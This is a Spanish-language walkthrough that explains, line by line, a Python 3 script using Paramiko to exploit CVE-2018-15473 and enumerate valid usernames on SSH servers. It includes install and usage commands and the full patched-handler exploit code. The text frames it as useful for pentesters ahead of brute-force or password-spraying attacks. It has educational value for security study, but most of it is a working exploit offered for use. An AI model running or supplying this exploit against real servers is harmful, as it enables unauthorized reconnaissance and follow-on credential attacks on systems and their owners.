
---

# Información general

Este script explota la vulnerabilidad **CVE-2018-15473** en servidores SSH.  
La vulnerabilidad consiste en que **el servidor SSH responde distinto según si el usuario existe o no**, lo que permite enumerar usuarios válidos en un sistema remoto.

> Esto es útil para un pentester, porque saber qué usuarios existen permite luego ataques de fuerza bruta o password spraying.

El script está adaptado a **Python 3** y usa la librería **Paramiko**, que permite interactuar con SSH desde Python.

---

## Dependencias

Para que funcione necesitas instalar `paramiko`:

```bash
pip install paramiko
```

---

## Cómo usarlo

```bash
python3 ssh_enum.py <target> -p <port> <username>
```

Ejemplo:

```bash
python3 ssh_enum.py 192.168.1.74 -p 22 root
```

- Si el usuario existe → `[+] root es un usuario válido`
    
- Si no existe → `[-] root no es un usuario válido`
    

---

## Explicación del script línea por línea

### Importaciones y clase de error

```python
import argparse, logging, paramiko, socket, sys, os

class InvalidUsername(Exception):
    pass
```

- Importa librerías necesarias.
    
- Define un error personalizado `InvalidUsername` para manejar usuarios inválidos.
    

---

### Funciones “maliciosas” para manipular Paramiko

```python
def add_boolean(*args, **kwargs):
    pass
```

- Esta función reemplaza temporalmente `Message.add_boolean` de Paramiko.
    
- Se usa para **malformar el paquete SSH**, no hace nada por sí misma, pero evita que Paramiko valide correctamente los mensajes.
    

---

```python
old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT]
```

- Guarda la función original que maneja `MSG_SERVICE_ACCEPT` (mensaje de aceptación de servicio SSH).
    

---

```python
def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)
```

- Sobrescribe temporalmente el manejo de `MSG_SERVICE_ACCEPT` para usar nuestra función maliciosa.
    
- Esto permite enviar un paquete que **provoca que el servidor revele si el usuario existe o no**.
    

---

```python
def invalid_username(*args, **kwargs):
    raise InvalidUsername()
```

- Si el servidor indica que el usuario es inválido, lanza la excepción personalizada.
    

---

```python
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username
```

- Aquí es donde **Paramiko se “engaña” para explotar la vulnerabilidad**:
    
    - `MSG_SERVICE_ACCEPT` → ahora usa nuestro `service_accept`.
        
    - `MSG_USERAUTH_FAILURE` → lanza `InvalidUsername` si falla la autenticación.
        

---

### Función que realiza la verificación

```python
def check_user(username):
    sock = socket.socket()
    sock.connect((args.target, int(args.port)))
    transport = paramiko.transport.Transport(sock)

    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        print('[!] Fallo en la conexión SSH')
        sys.exit(2)

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except InvalidUsername:
        print(f"[-] {username} no es un usuario válido")
        sys.exit(3)
    except paramiko.ssh_exception.AuthenticationException:
        print(f"[+] {username} es un usuario válido")
```

**Qué hace esta función:**

1. Conecta al servidor SSH.
    
2. Inicia el cliente SSH (`start_client()`).
    
3. Intenta autenticarse usando una **clave pública generada al vuelo**.
    
    - Si el usuario **no existe** → cae en `InvalidUsername`.
        
    - Si el usuario **existe pero la clave es inválida** → cae en `AuthenticationException`, y eso confirma que el usuario **sí existe**.
        

---

### Configuración de logging

```python
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
```

- Desactiva los mensajes de log de Paramiko para que la salida sea limpia.
    

---

### Manejo de argumentos

```python
parser = argparse.ArgumentParser(description='SSH User Enumeration...')
parser.add_argument('target', help="Dirección IP del sistema objetivo")
parser.add_argument('-p', '--port', default=22, help="Introduce puerto SSH")
parser.add_argument('username', help="Usuario que se quiere validar")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()
```

- Define los argumentos que el script acepta: IP objetivo, puerto y usuario.
    
- Si no se pasan argumentos, muestra ayuda y termina.
    

---

### Ejecución final

```python
check_user(args.username)
```

- Llama a la función que verifica si el usuario existe.
    

---

## Resumen del flujo

1. Conecta al servidor SSH.
    
2. Manipula internamente Paramiko para enviar un paquete especial.
    
3. Intenta autenticarse con un usuario dado y una clave aleatoria.
    
4. Dependiendo de la respuesta del servidor:
    
    - Diferente respuesta → usuario **válido**.
        
    - Otra respuesta → usuario **inválido**.
        

---
